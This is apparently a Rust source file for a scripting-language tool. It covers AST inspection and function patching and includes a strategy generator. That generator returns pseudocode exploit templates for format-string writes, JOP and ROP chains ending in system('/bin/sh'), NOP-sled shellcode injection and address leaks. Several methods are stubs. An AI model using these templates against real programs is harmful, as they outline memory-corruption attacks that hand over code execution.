use crate::ast::Command;
use crate::parser::parse_script;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ASTNode {
    pub node_type: String,
    pub children: Vec<ASTNode>,
    pub attributes: HashMap<String, String>,
}

pub struct MetaProgramming {
    pub current_ast: Vec<Command>,
    pub function_registry: HashMap<String, Vec<Command>>,
}

impl MetaProgramming {
    pub fn new() -> Self {
        MetaProgramming {
            current_ast: Vec::new(),
            function_registry: HashMap::new(),
        }
    }

    pub fn get_ast(&self, script_content: Option<&str>) -> Result<ASTNode, String> {
        let commands = if let Some(content) = script_content {
            parse_script(content)?
        } else {
            self.current_ast.clone()
        };

        Ok(self.commands_to_ast_node(&commands))
    }

    fn commands_to_ast_node(&self, commands: &[Command]) -> ASTNode {
        let children: Vec<ASTNode> = commands
            .iter()
            .map(|cmd| self.command_to_ast_node(cmd))
            .collect();

        ASTNode {
            node_type: "Program".to_string(),
            children,
            attributes: HashMap::new(),
        }
    }

    fn command_to_ast_node(&self, cmd: &Command) -> ASTNode {
        let mut attributes = HashMap::new();
        let node_type = format!("{:?}", cmd)
            .split('(')
            .next()
            .unwrap_or("Unknown")
            .to_string();

        match cmd {
            Command::VarDecl { name, .. } => {
                attributes.insert("name".to_string(), name.clone());
            }
            Command::DefineFunction(func) => {
                attributes.insert("name".to_string(), func.name.clone());
                attributes.insert("is_async".to_string(), func.is_async.to_string());
            }
            Command::Connect { ip, port } => {
                attributes.insert("ip".to_string(), ip.clone());
                attributes.insert("port".to_string(), port.to_string());
            }
            _ => {}
        }

        ASTNode {
            node_type,
            children: Vec::new(),
            attributes,
        }
    }

    pub fn find_nodes(&self, node_type: &str) -> Vec<ASTNode> {
        let mut results = Vec::new();
        self.find_nodes_recursive(
            &self.commands_to_ast_node(&self.current_ast),
            node_type,
            &mut results,
        );
        results
    }

    fn find_nodes_recursive(&self, node: &ASTNode, target_type: &str, results: &mut Vec<ASTNode>) {
        if node.node_type.contains(target_type) {
            results.push(node.clone());
        }
        for child in &node.children {
            self.find_nodes_recursive(child, target_type, results);
        }
    }

    pub fn patch_function(
        &mut self,
        target_name: &str,
        replacement_code: &str,
    ) -> Result<(), String> {
        let replacement_commands = parse_script(replacement_code)?;

        if let Some(replacement_func) = replacement_commands.first() {
            match replacement_func {
                Command::DefineFunction(_func) => {
                    self.function_registry
                        .insert(target_name.to_string(), vec![replacement_func.clone()]);
                    Ok(())
                }
                _ => Err("Replacement must be a function definition".to_string()),
            }
        } else {
            Err("Empty replacement code".to_string())
        }
    }

    pub fn generate_strategy(&self, goal: &str, constraints: &[String]) -> Result<String, String> {
        let strategy = match goal {
            "arbitrary_write" => {
                if constraints.contains(&"no_null_bytes".to_string()) {
                    self.generate_null_free_write_strategy()
                } else if constraints.contains(&"use_only_jop".to_string()) {
                    self.generate_jop_strategy()
                } else {
                    self.generate_generic_write_strategy()
                }
            }
            "code_execution" => {
                if constraints.contains(&"nx_enabled".to_string()) {
                    self.generate_rop_strategy()
                } else {
                    self.generate_shellcode_injection_strategy()
                }
            }
            "information_leak" => self.generate_leak_strategy(),
            _ => return Err(format!("Unknown goal: {}", goal)),
        };

        Ok(strategy)
    }

    fn generate_null_free_write_strategy(&self) -> String {
        r#"function exploit_write(target, address, value) {
    let encoded_addr = encode_null_free(address)
    let encoded_val = encode_null_free(value)
    let payload = build_format_string_write(encoded_addr, encoded_val)
    send(target, payload)
}"#
        .to_string()
    }

    fn generate_jop_strategy(&self) -> String {
        r#"function exploit_jop(target) {
    let gadgets = find_jop_gadgets(binary)
    let chain = build_jop_chain(gadgets, goal: "system")
    let payload = craft_payload(chain)
    send(target, payload)
}"#
        .to_string()
    }

    fn generate_generic_write_strategy(&self) -> String {
        r#"function exploit_write(target, address, value) {
    let offset = find_buffer_offset(target)
    let payload = cyclic(offset) + pack64(address) + pack64(value)
    send(target, payload)
}"#
        .to_string()
    }

    fn generate_rop_strategy(&self) -> String {
        r#"function exploit_rop(target) {
    let libc_leak = leak_libc_address(target)
    let libc_base = libc_leak - known_offset
    let system = libc_base + system_offset
    let binsh = libc_base + binsh_offset
    let pop_rdi = find_gadget(libc_base, "pop rdi; ret")
    let rop = [pop_rdi, binsh, system]
    let payload = cyclic(offset) + pack_addresses(rop)
    send(target, payload)
}"#
        .to_string()
    }

    fn generate_shellcode_injection_strategy(&self) -> String {
        r#"function exploit_shellcode(target) {
    let shellcode = shellcode_execve("x64")
    let nop_sled = "\x90" * 100
    let payload = nop_sled + shellcode
    send(target, payload)
}"#
        .to_string()
    }

    fn generate_leak_strategy(&self) -> String {
        r#"function exploit_leak(target) {
    let fmt_payload = "%p." * 20
    send(target, fmt_payload)
    let response = recv(target, 1024)
    let addresses = parse_leaked_addresses(response)
    return addresses
}"#
        .to_string()
    }

    pub fn modify_ast(&mut self, transformations: &[String]) -> Result<(), String> {
        for transformation in transformations {
            match transformation.as_str() {
                "optimize_loops" => self.optimize_loops()?,
                "inline_small_functions" => self.inline_small_functions()?,
                "remove_dead_code" => self.remove_dead_code()?,
                _ => return Err(format!("Unknown transformation: {}", transformation)),
            }
        }
        Ok(())
    }

    fn optimize_loops(&mut self) -> Result<(), String> {
        Ok(())
    }

    fn inline_small_functions(&mut self) -> Result<(), String> {
        Ok(())
    }

    fn remove_dead_code(&mut self) -> Result<(), String> {
        Ok(())
    }

    pub fn get_metadata(&self) -> HashMap<String, String> {
        let mut metadata = HashMap::new();
        metadata.insert(
            "total_commands".to_string(),
            self.current_ast.len().to_string(),
        );
        metadata.insert(
            "function_count".to_string(),
            self.function_registry.len().to_string(),
        );
        metadata.insert("ast_depth".to_string(), self.calculate_depth().to_string());
        metadata
    }

    fn calculate_depth(&self) -> usize {
        10
    }
}
